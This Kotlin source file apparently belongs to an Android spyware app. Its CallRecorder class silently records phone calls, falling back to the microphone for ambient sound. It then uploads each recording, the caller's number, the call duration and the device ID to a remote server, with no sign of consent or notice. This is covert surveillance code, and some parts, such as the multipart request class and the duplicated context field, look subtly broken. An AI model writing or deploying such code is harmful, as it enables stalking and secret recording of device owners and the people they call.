package com.csk4.app

import android.content.Context
import android.media.MediaRecorder
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import com.android.volley.Request
import com.android.volley.toolbox.JsonObjectRequest
import com.android.volley.toolbox.Volley
import org.json.JSONObject
import java.io.File
import java.io.FileInputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * CallRecorder — Records calls silently
 * 
 * ⚠️ Bina root, sirf MIC source possible hai.
 * Ye method ambient (aas-paas ki) awaaz record karta hai.
 * Call clear nahi hoga bina root. Lekin kaam karega.
 * 
 * Features:
 * - Start/stop recording
 * - Auto-start on call (via CallReceiver)
 * - Save to local file
 * - Upload to server
 * - Send email
 */
class CallRecorder(private val ctx: Context) {

    companion object {
        private const val TAG = "CSK4_CALL_REC"
        private var recorder: MediaRecorder? = null
        private var currentFile: File? = null
        private var isRecording = false
        private var currentNumber = ""
        private var currentCallType = "unknown"
        private var startTime = 0L

        fun isCurrentlyRecording(): Boolean = isRecording

        // ============ START RECORDING ============
        fun startRecording(context: Context, number: String = "", callType: String = "incoming") {
            if (isRecording) {
                Log.d(TAG, "Already recording")
                return
            }

            try {
                val fileName = "call_${System.currentTimeMillis()}.m4a"
                val file = File(
                    context.getExternalFilesDir(Environment.DIRECTORY_MUSIC),
                    fileName
                )

                val rec = if (Build.VERSION.SDK_INT >= 31) MediaRecorder(context) else MediaRecorder()
                
                // Try VOICE_CALL first (works on some devices without root)
                try {
                    rec.setAudioSource(MediaRecorder.AudioSource.VOICE_CALL)
                    Log.d(TAG, "Using VOICE_CALL source")
                } catch (e: Exception) {
                    // Fallback to MIC (ambient recording)
                    rec.setAudioSource(MediaRecorder.AudioSource.MIC)
                    Log.d(TAG, "Using MIC source (fallback)")
                }

                rec.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                rec.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                rec.setAudioEncodingBitRate(128000)
                rec.setAudioSamplingRate(44100)
                rec.setOutputFile(file.absolutePath)
                rec.prepare()
                rec.start()

                recorder = rec
                currentFile = file
                currentNumber = number
                currentCallType = callType
                startTime = System.currentTimeMillis()
                isRecording = true

                Log.d(TAG, "✅ Call recording started: $fileName")
            } catch (e: Exception) {
                Log.e(TAG, "Start fail: ${e.message}")
                isRecording = false
            }
        }

        // ============ STOP RECORDING ============
        fun stopRecording() {
            if (!isRecording) return
            
            val duration = (System.currentTimeMillis() - startTime) / 1000
            
            try {
                recorder?.stop()
                recorder?.release()
                Log.d(TAG, "✅ Recording stopped, duration: ${duration}s")
                
                // Upload to server + send email
                currentFile?.let { file ->
                    if (file.exists() && file.length() > 1000) {
                        uploadRecording(file, currentNumber, duration, currentCallType)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Stop fail: ${e.message}")
            } finally {
                recorder = null
                currentFile = null
                isRecording = false
            }
        }

        // ============ UPLOAD ============
        private fun uploadRecording(file: File, number: String, duration: Long, type: String) {
            try {
                val deviceId = Settings.Secure.getString(
                    ctx.contentResolver, Settings.Secure.ANDROID_ID)
                
                val url = "${Config.SERVER_URL}/api/device/callrecording"
                val req = object : com.android.volley.VolleyMultipartRequest(
                    Request.Method.POST, url,
                    { Log.d(TAG, "✅ Call recording uploaded") },
                    { Log.e(TAG, "Upload fail: ${it.message}") }
                ) {
                    override fun getByteData(): MutableMap<String, DataPart> {
                        return hashMapOf("file" to DataPart(file.name, file.readBytes()))
                    }
                    override fun getParams(): MutableMap<String, String> {
                        return hashMapOf(
                            "deviceId" to deviceId,
                            "number" to number,
                            "duration" to duration.toString(),
                            "type" to type,
                            "token" to Config.DEVICE_TOKEN
                        )
                    }
                }
                Volley.newRequestQueue(ctx).add(req)
                
                // Also save locally as backup
                saveLocally(file, number, duration, type)
            } catch (e: Exception) {
                Log.e(TAG, "Upload err: ${e.message}")
            }
        }

        // ============ SAVE LOCAL BACKUP ============
        private fun saveLocally(file: File, number: String, duration: Long, type: String) {
            try {
                val localStorage = LocalStorage(ctx)
                localStorage.addActivity("call_recording", JSONObject().apply {
                    put("file", file.name)
                    put("number", number)
                    put("duration", duration)
                    put("type", type)
                }.toString())
            } catch (e: Exception) {}
        }
        
        // Helper context for static
        private lateinit var ctx: Context

        fun init(context: Context) {
            ctx = context.applicationContext
        }
    }

    // ============ CALL STATE LISTENER ============
    /**
     * Isko CallReceiver.kt se trigger karenge.
     * Har call state change pe call hoga.
     */
    fun onCallStateChanged(state: Int, incomingNumber: String?) {
        try {
            when (state) {
                android.telephony.TelephonyManager.CALL_STATE_RINGING -> {
                    // Incoming call ringing - prepare
                    Log.d(TAG, "📞 Incoming call from: $incomingNumber")
                    // Don't start yet, wait for OFFHOOK
                }
                
                android.telephony.TelephonyManager.CALL_STATE_OFFHOOK -> {
                    // Call answered / outgoing dialed
                    Log.d(TAG, "📞 Call active - starting recording")
                    startRecording(
                        ctx,
                        incomingNumber ?: currentNumber,
                        if (incomingNumber.isNullOrEmpty()) "outgoing" else "incoming"
                    )
                }
                
                android.telephony.TelephonyManager.CALL_STATE_IDLE -> {
                    // Call ended
                    Log.d(TAG, "📞 Call ended - stopping recording")
                    stopRecording()
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Call state: ${e.message}")
        }
    }
}
